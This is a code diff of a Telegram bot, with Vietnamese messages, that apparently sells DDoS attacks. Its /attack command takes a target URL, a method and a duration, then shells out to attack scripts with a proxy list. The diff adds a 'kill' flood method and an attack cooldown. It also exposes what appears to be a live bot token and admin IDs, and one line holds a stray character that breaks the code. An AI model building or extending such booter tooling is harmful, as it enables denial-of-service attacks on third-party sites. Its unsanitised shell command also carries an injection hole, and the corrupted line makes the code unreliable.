@@ -4,7 +4,7 @@ const token = '7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc';
 const bot = new TelegramBot(token, { polling: true });
 const admins = [6601930239, 1848131455];
 const groupId = -1002370415846;
-const methods = ['tls', 'flood', 'reflood'];
+const methods = ['tls', 'flood', 'reflood', 'kill'];
 const db = Database('bot.db');
 db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
 CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
@@ -25,6 +25,8 @@ let maintenance = getSetting.get('maintenance').value === 'true';
 let blacklist = getAllBlacklist.all().map(r => r.keyword);
 let activeSlots = parseInt(getSetting.get('activeSlots').value);
 const maxSlots = 2;
+let lastAttackTime = 0;
+const cooldown = 30000;
 
 function syncSlotsFromDb() {
   removeExpiredSlots.run(Math.floor(Date.now() / 1000));
@@ -33,7 +35,7 @@ function syncSlotsFromDb() {
 }
 syncSlotsFromDb();
 
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/スタート/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
@@ -44,11 +46,11 @@ bot.onText(/\/methods/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
-  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Sent Cloudflare\n• flood -> Bản v1, requests ổn\n• reflood -> Bản v2, nhiều ip hơn v1`, { parse_mode: "Markdown" });
+  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• reflood -> Bản v2, nhiều ip nhưng yếu hơn v1\n• kill -> Mạnh nhưng no bypass`, { parse_mode: "Markdown" });
 });
 
 bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
-  const chatId = msg.chat.id;
+  const chatId = msg.chat.id构
   const userId = msg.from.id;
   if (!admins.includes(userId)) return bot.sendMessage(chatId, 'Bạn không có quyền sử dụng lệnh này.');
   const bl = getAllBlacklist.all().map(r => r.keyword);
@@ -117,7 +119,7 @@ bot.onText(/\/attack$/, (msg) => {
   bot.sendMessage(chatId, 'Cú pháp: /attack [url] [method] [time]\nVD: /attack https://abc.com tls 30', { parse_mode: "Markdown" });
 });
 
-bot.onText(/\/attack (.+) (tls|flood|reflood) (\d+)/, (msg, match) => {
+bot.onText(/\/attack (.+) (tls|flood|reflood|kill) (\d+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
@@ -144,12 +146,18 @@ bot.onText(/\/attack (.+) (tls|flood|reflood) (\d+)/, (msg, match) => {
     bot.sendMessage(chatId, '🚫 Hiện không còn slot trống, vui lòng thử lại sau.', { parse_mode: "Markdown" });
     return;
   }
-  const now = Math.floor(Date.now() / 1000);
-  const endTime = now + time;
+  const now = Date.now();
+  if (now - lastAttackTime < cooldown) {
+    const waitTime = Math.ceil((cooldown - (now - lastAttackTime)) / 1000);
+    bot.sendMessage(chatId, `⏳ Vui lòng đợi ${waitTime}s trước khi gửi attack tiếp theo.`, { parse_mode: "Markdown" });
+    return;
+  }
+  const endTime = Math.floor(now / 1000) + time;
   addSlot.run(userId, url, method, endTime);
   activeSlots++;
   setSetting.run('activeSlots', activeSlots.toString());
-  bot.sendMessage(chatId, `🔫 Attack sent!\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\``, { parse_mode: "Markdown" });
+  lastAttackTime = now;
+  bot.sendMessage(chatId, `*🔫 Attack sent!*\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\``, { parse_mode: "Markdown" });
   const { exec } = require('child_process');
   exec(`node ${method}.js ${url} ${time} 36 6 proxy.txt`, (error, stdout, stderr) => {
     removeSlot.run(userId, url, method);
